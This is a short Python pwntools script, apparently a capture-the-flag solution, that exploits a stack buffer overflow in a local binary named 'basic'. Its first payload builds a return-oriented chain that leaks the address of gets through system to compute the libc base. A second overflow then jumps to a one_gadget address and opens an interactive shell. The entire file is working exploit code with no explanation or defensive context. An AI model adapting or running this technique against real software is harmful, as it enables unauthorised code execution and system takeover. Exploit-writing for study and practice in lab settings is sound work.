#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./basic")
elf = ELF("./basic")
libc = elf.libc
rtc1 = 0x40073a
rtc2 = 0x400720
p1ret = 0x00400743

rbx = 0
rbp = 1
r12 = elf.got['system']

pay = 'A'*(0x90+0x8) + p64(p1ret) + p64(elf.got['gets']) + p64(elf.plt['system'])
pay += p64(elf.symbols['main'])
p.sendline(pay)

p.recvuntil("sh: 1: ")
gets = u64(p.recvuntil("\x7f") + "\x00\x00")
log.info("gets: "+hex(gets))
libcBase = gets - libc.symbols['gets']
one_gadget = libcBase + 0x45216

p.sendlineafter("found\n", 'A'*(0x90+0x8) + p64(one_gadget))

p.interactive()
